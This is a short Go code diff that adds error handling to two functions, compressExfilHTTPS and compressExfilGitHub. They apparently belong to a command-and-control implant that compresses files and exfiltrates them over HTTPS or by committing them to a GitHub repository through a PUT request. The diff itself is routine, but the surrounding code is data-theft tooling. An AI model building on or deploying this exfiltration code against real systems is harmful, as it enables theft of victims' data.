@@ -124,7 +124,10 @@ func compressExfilHTTPS(task structs.Task, params CompressParams) structs.Comman
 		ArchivePath:  archivePath,
 		Status:       "transferred",
 	}
-	resultJSON, _ := json.Marshal(result)
+	resultJSON, err := json.Marshal(result)
+	if err != nil {
+		return errorf("Error: failed to marshal result: %v", err)
+	}
 	return successResult(string(resultJSON))
 }
 
@@ -306,7 +309,10 @@ func compressExfilGitHub(task structs.Task, params CompressParams) structs.Comma
 	if gh.SHA != "" {
 		reqBody["sha"] = gh.SHA
 	}
-	bodyJSON, _ := json.Marshal(reqBody)
+	bodyJSON, err := json.Marshal(reqBody)
+	if err != nil {
+		return errorf("Error: failed to marshal result: %v", err)
+	}
 
 	req, err := http.NewRequest("PUT", apiURL, bytes.NewReader(bodyJSON))
 	if err != nil {
@@ -357,7 +363,10 @@ func compressExfilGitHub(task structs.Task, params CompressParams) structs.Comma
 		CleanedUp: cleanedUp,
 		Status:    "committed",
 	}
-	resultJSON, _ := json.Marshal(result)
+	resultJSON, err := json.Marshal(result)
+	if err != nil {
+		return errorf("Error: failed to marshal result: %v", err)
+	}
 	return successResult(string(resultJSON))
 }
 
